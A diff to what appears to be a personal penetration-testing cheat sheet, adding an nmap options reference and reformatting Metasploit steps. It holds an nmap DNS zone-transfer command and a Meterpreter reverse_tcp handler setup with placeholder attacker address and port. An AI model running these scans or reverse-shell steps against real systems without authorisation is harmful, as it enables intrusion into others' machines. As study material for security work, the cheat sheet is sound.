@@ -392,7 +392,37 @@ root@omarbelkady: ~$ curl url/nameofimage.jpg > nameYouWishToCallYourImage.jpg
 ```
 
 
-## DNS Enumeration AND ZONE Transfer we must use port 53 for ZT
+## NMAP Usage
+```bash
+# nmap [Scan Type(s)] [Options] {target specification}
+# Options
+# -iL <inputfilename>: Input from list of hosts/networks
+# -iR <num hosts>: Choose random targets
+# –exclude <host1[,host2][,host3],…>: Exclude hosts/networks
+# –excludefile <exclude_file>: Exclude list from file
+# -p <port ranges>: Only scan specified ports
+# -F: Fast mode – Scan fewer ports than the default scan
+# -r: Scan ports consecutively – don’t randomize
+# –top-ports <number>: Scan <number> most common ports
+# –port-ratio <ratio>: Scan ports more common than <ratio>
+# -sV: Probe open ports to determine service/version info
+# –version-intensity <level>: Set from 0 (light) to 9 (try all probes)
+# –version-light: Limit to most likely probes (intensity 2)
+# –version-all: Try every single probe (intensity 9)
+# –version-trace: Show detailed version scan activity (for debugging)
+# -sL: List Scan – simply list hosts to scan
+# -sn: Ping Scan – disable port scan
+# -Pn: Treat all hosts as online — skip host discovery
+# -PS/PA/PU/PY[portlist]: TCP SYN/ACK, UDP or SCTP discovery to given ports
+# -PE/PP/PM: ICMP echo, timestamp, and netmask request discovery probes
+# -PO[protocol list]: IP Protocol Ping
+# -n/-R: Never do DNS resolution/Always resolve [default: sometimes]
+# –dns-servers <serv1[,serv2],…>: Specify custom DNS servers
+# –system-dns: Use OS’s DNS resolver
+# –traceroute: Trace hop path to each host
+```
+
+### DNS Enumeration AND ZONE Transfer we must use port 53 for ZT
 ```bash
 nmap -p 53 --script dns-zone-transfer --script-args dns-zone-transfer.domain=targer-url
 ```
@@ -745,27 +775,52 @@ run
 ```
 
 #### STEP 5: exploit
-```
+```bash
 exploit
 ```
 
 ### WAY N2[CORRECT WAY]
-```
+```bash
 use multi/handler
 ```
 
-```
+```bash
 set payload windows/meterpreter/reverse_tcp
 ```
 
-```
+```bash
 set LHOST 192.XXX.X.XXX
 ```
 
-```
+```bash
 set LPORT XXXX
 ```
 
-```
+```bash
 exploit
 ```
+
+
+### display which addresses are available
+```bash
+show targets
+```
+
+### See if the selected module is vulnerable to x target
+```bash
+check
+```
+
+
+### Look up a certain module/exploit
+```bash
+info
+```
+
+### RHOST VS LHOST
+```
+LHOST: Yours
+RHOST: THEIRS
+```
+
+
